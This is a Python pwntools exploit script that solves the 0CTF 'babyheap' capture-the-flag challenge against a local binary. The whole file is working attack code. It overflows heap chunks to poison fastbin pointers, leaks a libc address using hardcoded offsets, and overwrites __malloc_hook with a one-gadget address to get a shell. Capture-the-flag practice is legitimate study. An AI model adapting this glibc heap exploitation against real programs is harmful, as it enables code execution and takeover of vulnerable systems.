#!/usr/bin/env python

from pwn import *
import sys

def alloc(size):
	p.sendline("1")
	p.recvuntil("Size: ")
	p.sendline(str(size))
	p.recvuntil("Command: ")

def free(index):
	p.sendline("3")
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Command: ")

def fill(string, index):
	p.sendline("2")
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Size: ")
	p.sendline(str(len(string)))
	p.recvuntil("Content: ")
	p.sendline(str(string))
	p.recvuntil("Command: ")
	
def dump(index):
	p.sendline("4")
	p.recvuntil("Index: ")
	p.sendline(str(index))
	p.recvuntil("Content: \n")
	data = p.recvline()
	p.recvuntil("Command: ")
	return u64(data[:8])

if __name__ == "__main__":
#	context.log_level = "debug"
	p = process('./0ctfbabyheap')
	p.recvuntil(": ")


	alloc(0x10) #Index 0
	alloc(0x10)	#Index 1
	alloc(0x10)	#Index 2
	alloc(0x80)	#Index 3
	alloc(0x80)	#Index 4

	free(2)
	free(1)
	
	payload = p64(0) * 3
	payload += p64(0x21)
	payload += p8(0x60)
	fill(payload, 0)

	alloc(0x10)	#Index 1
	
	payload = p64(0) * 3	
	payload += p64(0x21)
	payload += p64(0) * 3
	payload += p64(0x21)
	fill(payload, 1)

	alloc(0x10)	#Index 2

	payload = p64(0) * 3	
	payload += p64(0x21)
	payload += p64(0) * 3
	payload += p64(0x91)
	fill(payload, 1)
	free(3)

	Libcbase = dump(2) - 0x3c4b78
	Shelladd = Libcbase + 0x41374
	Mallochk = Libcbase + 0x3c4aed
	log.info("Libcbase:	" + hex(Libcbase))
	log.info("Shelladd:	" + hex(Shelladd))
	log.info("Mallochk:	" + hex(Mallochk))
	
	alloc(0x10)	#Index 3
	free(3)
	free(1)
	payload = p64(0) * 3
	payload += p64(0x21)
	payload += p64(Mallochk)	#What address should put in the fastbin free list?
	fill(payload, 0)

	alloc(0x10)	#Index 1
	alloc(0x60)	#Index 3
	fill(p64(Shelladd), 3)
#	gdb.attach(p)
	

	alloc(0x10)
	alloc(0x10)
	alloc(0x10)
	alloc(0x10)
	alloc(0x10)
	alloc(0x10)
	alloc(0x10)
	alloc(0x10)
	alloc(0x10)
	alloc(0x10)
